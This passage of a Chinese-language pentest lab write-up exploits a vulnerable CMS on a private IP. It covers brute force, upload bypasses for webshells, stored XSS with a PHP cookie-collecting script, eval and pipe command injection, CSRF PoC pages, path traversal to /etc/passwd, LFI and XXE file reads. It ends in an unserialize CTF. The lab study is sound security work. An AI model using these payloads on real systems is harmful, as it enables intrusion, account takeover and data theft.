            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;立即提交&quot;</span> <span class="hljs-keyword">in</span> res.text:
                flag += word
                <span class="hljs-keyword">break</span>
        print(flag)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    dump()</code></pre>

<p>成功获取到数据库名，漏洞利用成功。</p>
<h2 id="6-暴力破解"><a href="#6-暴力破解" class="headerlink" title="6.暴力破解"></a>6.暴力破解</h2><p>该漏洞是由于管理员或者用户使用了常用的简单密码，攻击者可以通过暴力破解的方式获取用户名和密码，前面的sql注入我们可以知道管理员账号为admin,但是密码为加盐后的md5值，我们无法破解，只能尝试使用暴力破解。</p>
<p>在文件上传漏洞点一中我们发现了admin模块就在路径为<code>\application\admin</code>，所以管理员后台url应该为<code>http://192.168.164.147/admin</code></p>
<p>当然这里也可以根据经验猜测后台登录路径。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323144704682.png" alt="image-20210323144704682"></p>
<p>访问后台</p>
<p>查看源码可以发现，登录是需要token的，但是还是可以使用bp自带的模块破解，不过需要麻烦一点。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406191847633.png" alt="image-20210406191847633"></p>
<ul>
<li><p>使用bp抓包，将数据包发送到<code>Intruder</code>模块，然后加上参数，选择<code>Pitchfork</code>模式</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192132707.png" alt="image-20210406192132707" style="zoom:67%;">
</li>
<li><p>到option页面，不可以多线程</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192222031.png" alt="image-20210406192222031" style="zoom:67%;">

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192611191.png" alt="image-20210406192611191" style="zoom:67%;">

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192635613.png" alt="image-20210406192635613"></p>
</li>
<li><p>设置payload1,也就是token值</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406192820026.png" alt="image-20210406192820026"></p>
</li>
<li><p>设置payload2 password的值，这里可以选择自己收藏的密码字典，或者直接使用bp自带的。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193125862.png" alt="image-20210406193125862" style="zoom:67%;">

</li>
</ul>
<p>爆破结果</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193217954.png" alt="image-20210406193217954" style="zoom: 67%;">

<p>当密码为admin时，可以看到相应包中返回的数据存在一个url，很明显这里是，登录成功后进行的跳转，可以在浏览器中看到，已经登录到了后台页面</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406193418062.png" alt="image-20210406193418062" style="zoom:67%;">





<p>结合前面sql注入获取的密码和encrypt，尝试猜测密码的保存方式</p>
<pre><code class="hljs apache"><span class="hljs-attribute">md5</span>(&#x27;adminWo<span class="hljs-number">0</span>bAa&#x27;) = <span class="hljs-number">9724</span>b<span class="hljs-number">5</span>e<span class="hljs-number">6</span>c<span class="hljs-number">56</span>b<span class="hljs-number">95</span>f<span class="hljs-number">5723009</span>ef<span class="hljs-number">81961</span>bfe</code></pre>

<p>所以密码保存的是密码和加密因子拼接后的md5值。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323150840468.png" alt="image-20210323150840468" style="zoom:67%;">

<h2 id="7-文件上传（3个）"><a href="#7-文件上传（3个）" class="headerlink" title="7.文件上传（3个）"></a>7.文件上传（3个）</h2><h3 id="漏洞点一-1"><a href="#漏洞点一-1" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>用户登录后可以看到一个图片征集页面<code>http://192.168.164.147/member/index/photo</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220533116.png" alt="image-20210420220533116"></p>
<p>随便上传一个图片文件后，可以看到返回了图片的保存地址</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220615042.png" alt="image-20210420220615042"></p>
<p>但是当上传一个非图片类型时，会提示只允许上传<code>.jpg|.png|.gif</code></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220733976.png" alt="image-20210420220733976"></p>
<p>这只是前端检测，抓包就可以解决</p>
<p>抓包上传一个php为后缀的文件，并将MIME改为<code>image/jpeg</code>,可以看到php后缀被换成空了</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420220956393.png" alt="image-20210420220956393"></p>
<p>尝试双写绕过，可以看到文件已经正常上传</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420221049529.png" alt="image-20210420221049529"></p>
<p>访问可以看到phpinfo<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420221137498.png" alt="image-20210420221137498" style="zoom:50%;"></p>
<p>下面就是上传一句话木马，控制服务器</p>
<h3 id="漏洞点二-1"><a href="#漏洞点二-1" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>用户登录后可以在内容管理—&gt;在线投稿的位置投稿，这里用户可以上传稿件中需要用到图片</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406154414604.png" alt="image-20210406154414604" style="zoom: 50%;">

<p>但是攻击者可能会上传一些刻意文件，比如一句话木马，来攻击服务器，下面我们上传一个php文件获取<code>phpinfo</code></p>
<p>首先选择一张空的照片，然后将其改为php文件，内容为<code>&lt;? phpinfo(); ?&gt;</code>，可以看到上传成功的url</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160155045.png" alt="image-20210406160155045"></p>
<p>访问服务器返回的url，已经看到该网站的phpinfo信息，也就是确定了该上传目录拥有可执行权限，下一步就是上传一句话木马进一步控制该服务器。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160256835.png" alt="image-20210406160256835"></p>
<p>上传一句话木马</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406160534542.png" alt="image-20210406160534542"></p>
<p>使用蚁剑连接即可。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322205328527.png" alt="image-20210322205328527"></p>
<h3 id="漏洞点三-1"><a href="#漏洞点三-1" class="headerlink" title="漏洞点三"></a>漏洞点三</h3><p>在上一步中我们已经知道了admin的账号密码，然后登录。再用自己注册的账号向某个栏目投稿，之后管理员再审核，便会出现一个类似于用户投稿的页面，然后就可以像上一个漏洞一样上传一句话木马文件。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406161255195.png" alt="image-20210406161255195"></p>
<h2 id="8-XSS（2个）"><a href="#8-XSS（2个）" class="headerlink" title="8.XSS（2个）"></a>8.XSS（2个）</h2><h3 id="漏洞点一-2"><a href="#漏洞点一-2" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>登录管理员账号后可以发送短消息给用户</p>
<p>在之前的sql注入漏洞里，我们可以获取<code>yzn_member</code>表中的所有信息，虽然可以获取密码，但是因为是md5值，并且是加盐后的md5值，破解的难度很高，所以可以使用获取cookie的方式攻击。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322212238672.png" alt="image-20210322212238672" style="zoom:67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322212821313.png" alt="image-20210322212821313" style="zoom: 67%;"></p>
<p>从中可以看到用户登录的时间，从而可以判断该用户是否在线，我们选择那些在线的用户，获取其浏览器的cookie，这样就可以做到密码登录其账号。</p>
<p>尝试向用户<code>szy</code>发送带有恶意脚本的短消息，内容如下</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323151141271.png" alt="image-20210323151141271"></p>
<p>发送完后，浏览器弹出<code>xss</code>，并且每次刷新都会出现弹窗，说明是存储型XSS。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323151240397.png" alt="image-20210323151240397"></p>
<p>当用户点开收件箱时，浏览器也会出现弹窗，说明漏洞利用成</p>
<p>==尝试获取用户cookie(失败)==</p>
<p>首先在服务器上写一个获取cookie的脚本，内容如下，就是获取cookie参数，然后将其写入cookie.txt中，并记录写入的时间。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];
<span class="hljs-variable">$ip</span> = getenv (<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>);
<span class="hljs-variable">$time</span> = date(<span class="hljs-string">&#x27;Y-m-d g:i:s&#x27;</span>);
<span class="hljs-variable">$fp</span> = fopen(<span class="hljs-string">&quot;cookie.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);
fwrite(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&quot;IP: &quot;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;Date: &quot;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&quot; Cookie:&quot;</span>.<span class="hljs-variable">$cookie</span>.<span class="hljs-string">&quot;\n&quot;</span>);
fclose(<span class="hljs-variable">$fp</span>);
<span class="hljs-meta">?&gt;</span></code></pre>

<p>然后向用户发送带有恶意脚本的消息，<code>192.168.164.1</code>为服务器的ip地址，这里就使用了自己的本机地址，而在现实的渗透测试中是需要选择能够与公网通信的服务器或者vps。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323153154260.png" alt="image-20210323153154260" style="zoom:67%;">

<p>当用户点开收件箱后，这个脚本就会自动执行，就可以将cookie写入到服务器上的cookie.txt。</p>
<p>查看cookie.txt 获取的cookie</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323153009193.png" alt="image-20210323153009193"></p>
<p>但是可以发现这里的cookie好像并不完整，看了一下原来是PHPsession值那里设置了http-only，而http-only就是防止通过js脚本读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408154117932.png" alt="image-20210408154117932" style="zoom:67%;">

<h3 id="漏洞点二-2"><a href="#漏洞点二-2" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>登录后的用户可以在留言板进行留言，留言后会显示近期的留言信息</p>
<p>url <a href="http://192.168.164.147/member/index/comment.html">http://192.168.164.147/member/index/comment.html</a></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223132548.png" alt="image-20210419223132548"></p>
<p>在留言中插入恶意脚本，此时数据会被提交到服务器处理，并写入数据库，显示近期的留言，此时恶意脚本被执行，造成了XSS漏洞</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223319706.png" alt="image-20210419223319706"></p>
<p>可以看大恶意脚本被浏览器执行，嵌入到html页面中</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223406331.png" alt="image-20210419223406331" style="zoom: 67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419223500074.png" alt="image-20210419223500074" style="zoom:67%;"></p>
<h2 id="9-RCE（2个）"><a href="#9-RCE（2个）" class="headerlink" title="9.RCE（2个）"></a>9.RCE（2个）</h2><h3 id="漏洞点一-3"><a href="#漏洞点一-3" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>后台管理中存在一个采集模块，其中存在于一个“phpinfo”，点击即可查看到phpinfo信息</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413165611927.png" alt="image-20210413165611927"></p>
<p>这里看似没有提交参数位置，让人觉得无从下手，在前端查看源码即可发现，是将输入框隐藏了，才无法看见，输入的内容。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413170143896.png" alt="image-20210413170143896"></p>
<p>抓包就可以发现端倪，可以看到这里存在一个post方式提交了一个data参数</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413165919019.png" alt="image-20210413165919019"></p>
<p>提交的内容为</p>
<pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>=phpinfo()</span></code></pre>

<p>然后就返回了php的各项信息，应该是执行了phpinfo这个函数，那么可能就是用到了eval()函数，尝试输入</p>
<pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">data</span>=system(&#x27;<span class="hljs-title">ls</span> /&#x27;)</span></code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413170755721.png" alt="image-20210413170755721" style="zoom:67%;">

<p>利用成功。</p>
<h3 id="漏洞点二-3"><a href="#漏洞点二-3" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>后台管理中存在一个采集模块，其中存在于一个“查看内网主机”，可以查看内网中的主机是否在线。查看一个主机是否在线最常用的方法就是使用<code>ping</code>命令，还要结合php中的<code>shell_exec()</code>函数。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323155906491.png" alt="image-20210323155906491"></p>
<p>尝试使用管道符拼接命令，造成命令执行。</p>
<p>payload:</p>
<pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> | ls /</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413171011227.png" alt="image-20210413171011227"></p>
<p>可以看到列出了根目录的文件夹，说明命令执行成功。</p>
<h2 id="10-CSRF（4个）"><a href="#10-CSRF（4个）" class="headerlink" title="10.CSRF（4个）"></a>10.CSRF（4个）</h2><h3 id="漏洞点一-4"><a href="#漏洞点一-4" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>用户主页面–&gt;积分赠送</p>
<p>输入用户名和要赠送积分的数量即可赠送自己的积分</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423171711582.png" alt="image-20210423171711582" style="zoom:50%;">

<p>当我们通过查找用户邮箱功能获取到某个用户的邮箱时，就可以构造出一个类似于下图的网页，生成链接后通过邮箱发给受害者然后诱使其点击链接，就能神不知鬼不觉的将其积分转到自己的账号下</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210423170700922.png" alt="image-20210423170700922" style="zoom:50%;">





<h3 id="漏洞点二-4"><a href="#漏洞点二-4" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>后台管理中，存在会员管理模块–&gt;点击编辑，在这里管理员可以改变会员的等级，积分和密码等。然而如果攻击者获取了更改用户等级的表单就可以精心构造出一个网页（burp可以一键生成），这个网页的功能可以将会员修改为攻击者想要的等级，或者是添加管理员。此时如果管理员不小心点击了这个链接，浏览器带着管理员登录时的<code>cookie</code>访问了该链接，那么服务器就认为修改会员等级的操作是管理员本人，执行该操作，从而造成攻击。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408153533206.png" alt="image-20210408153533206" style="zoom: 50%;">

<p>使用bp抓取该表单</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162252486.png" alt="image-20210323162252486" style="zoom: 50%;">

<pre><code class="hljs apache"><span class="hljs-attribute">username</span>=szy&amp;nickname=szy&amp;mobile=<span class="hljs-number">17856276754</span>&amp;email=<span class="hljs-number">263233</span>%<span class="hljs-number">40</span>qq.com&amp;password=&amp;groupid=<span class="hljs-number">2</span>&amp;point=<span class="hljs-number">0</span>&amp;vip=<span class="hljs-number">0</span>&amp;overduedate=<span class="hljs-number">1970</span>-<span class="hljs-number">01</span>-<span class="hljs-number">01</span>+<span class="hljs-number">08</span>%<span class="hljs-number">3</span>A<span class="hljs-number">00</span>%<span class="hljs-number">3</span>A<span class="hljs-number">00</span>&amp;id=<span class="hljs-number">1</span></code></pre>

<p>提交的数据中可以修改<code>groupid, point, vip</code></p>
<p>使用bp一键生成攻击网页</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162450984.png" alt="image-20210323162450984"></p>
<p>生成的内容为</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.164.147/member/member/edit.html?id=1&amp;dialog=1&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;szy&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;szy&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mobile&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;17856276754&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;263233<span class="hljs-symbol">&amp;#64;</span>qq<span class="hljs-symbol">&amp;#46;</span>com&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;groupid&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;5&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;point&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1000&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;vip&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;overduedate&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1970<span class="hljs-symbol">&amp;#45;</span>01<span class="hljs-symbol">&amp;#45;</span>01<span class="hljs-symbol">&amp;#32;</span>08<span class="hljs-symbol">&amp;#58;</span>00<span class="hljs-symbol">&amp;#58;</span>00&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>



<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323162711313.png" alt="image-20210323162711313" style="zoom:50%;">

<p>复制上面的链接，使用社工的方法发送给admin，如果他在处于登录状态时点击那么攻击就成功了。</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210406161709510.png" alt="image-20210406161709510"></p>
<p>点击<code>Submit request</code>，就会出现更新成功的提示。查看<code>szy</code>，确认其等级变化</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323163057847.png" alt="image-20210323163057847" style="zoom: 50%;">

<p>可以看到该用户的等级已经变成了高级会员，并且积分点数也变成了1000，漏洞利用成功。</p>
<h3 id="漏洞点三-2"><a href="#漏洞点三-2" class="headerlink" title="漏洞点三"></a>漏洞点三</h3><p>同样是在这个页面，有一个”添加”页面，同样也是存在CSRF漏洞，如果被攻击者利用，则可以创造出大量的无用账号，从而浪费服务器的资源，可能造成dos攻击。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408153639002.png" alt="image-20210408153639002" style="zoom: 33%;">



<h3 id="漏洞点四-1"><a href="#漏洞点四-1" class="headerlink" title="漏洞点四"></a>漏洞点四</h3><p>内容-&gt;稿件管理-&gt;通过审核，这里会显示所有用户提交的稿件，但是如果攻击者提交了一个含有恶意代码的稿件，又想在admin不知情的情况下让这个稿件通过审核，此时就可以创建一个恶意链接发送给admin，</p>
<p>内容如下</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://192.168.164.147/cms/publish/pass.html&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ids<span class="hljs-symbol">&amp;#91;</span><span class="hljs-symbol">&amp;#93;</span>&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;4&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>

<p>当admin点击后，就会让稿件通过审核</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419224904297.png" alt="image-20210419224904297" style="zoom: 33%;">



<h2 id="11-任意文件下载"><a href="#11-任意文件下载" class="headerlink" title="11.任意文件下载"></a>11.任意文件下载</h2><p>首页中存在一个图片下载模块，可以下载自己喜欢的球星壁纸</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144023954.png" alt="image-20210428144023954" style="zoom:50%;">

<p>但是我们可以拦截请求，修改提交的数据</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144326701.png" alt="image-20210428144326701"></p>
<p>尝试下载<code>/etc/passwd</code>文件，输入</p>
<pre><code class="hljs arcade">filename=<span class="hljs-regexp">/etc/</span>passwd</code></pre>

<p>但是出现提示<code>文件不存在！</code></p>
<p>尝试多输入几个<code>../</code></p>
<pre><code class="hljs awk">filename=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210428144637060.png" alt="image-20210428144637060" style="zoom:50%;">

<p>成功获取到<code>/etc/passwd</code>文件内容</p>
<p>那么就可以结合RCE漏洞，获取到该服务器上的任意文件</p>
<p>首先利用RCE漏洞获取到文件的完整路径，之后配合该漏洞即可实现任意文件下载。</p>
<h2 id="12-unserialize"><a href="#12-unserialize" class="headerlink" title="12.unserialize"></a>12.unserialize</h2><p>该漏洞就是一个CTF题目，但是源码需要利用前面的漏洞获取</p>
<p>链接:<a href="http://192.168.164.147/ctf/index">http://192.168.164.147/ctf/index</a></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323164427572.png" alt="image-20210323164427572" style="zoom:67%;">

<p>根据提示是一个ctf题目，那么应该也符合一般ctf中web题目的套路。</p>
<p>首先查看源码 ，获取提示</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323164641331.png" alt="image-20210323164641331"></p>
<p>但是一般的反序列化漏洞的题目都是有源码的，只有根据源码才能写出EXP。</p>
<p>既然没有源码，我们就需要使用之前发现的漏洞获取源码。</p>
<p>有五种获取源码的方法</p>
<ul>
<li><p>文件上传</p>
<p>上传一句话木马后，可以控制服务器，可以直接到网站根目录中下载文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171248434.png" alt="image-20210323171248434"></p>
</li>
<li><p>LFI</p>
<p>使用<code>php://filter</code>，在文件包含漏洞的位置获取base64源码</p>
<p>payload：</p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">164.147</span>:<span class="hljs-number">81</span><span class="hljs-regexp">/contact/i</span>ndex?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=unserialize.php</code></pre>



</li>
</ul>
<p>  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171514268.png" alt="image-20210323171514268"></p>
<ul>
<li><p>XXE</p>
<p>利用文件上传获取的路劲</p>
<p>payload</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span>
<span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY f <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///var/www/public/unserialize.php&quot;</span>&gt;</span></span>
<span class="hljs-meta">]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">info</span>&gt;</span>das<span class="hljs-tag">&lt;/<span class="hljs-name">info</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre>
</li>
<li><p>任意文件下载</p>
<p>点击即可下载到文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414195346355.png" alt="image-20210414195346355"></p>
</li>
<li><p>RCE</p>
<p>首先 列出目录</p>
<pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.0</span> | ls</code></pre>

<p>读取文件</p>
<pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.0</span> | cat unserialize.php</code></pre>



</li>
</ul>
<p>  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171610197.png" alt="image-20210323171610197"></p>
<p>  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210323171742181.png" alt="image-20210323171742181"></p>
<p>  源码如下</p>
  <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>
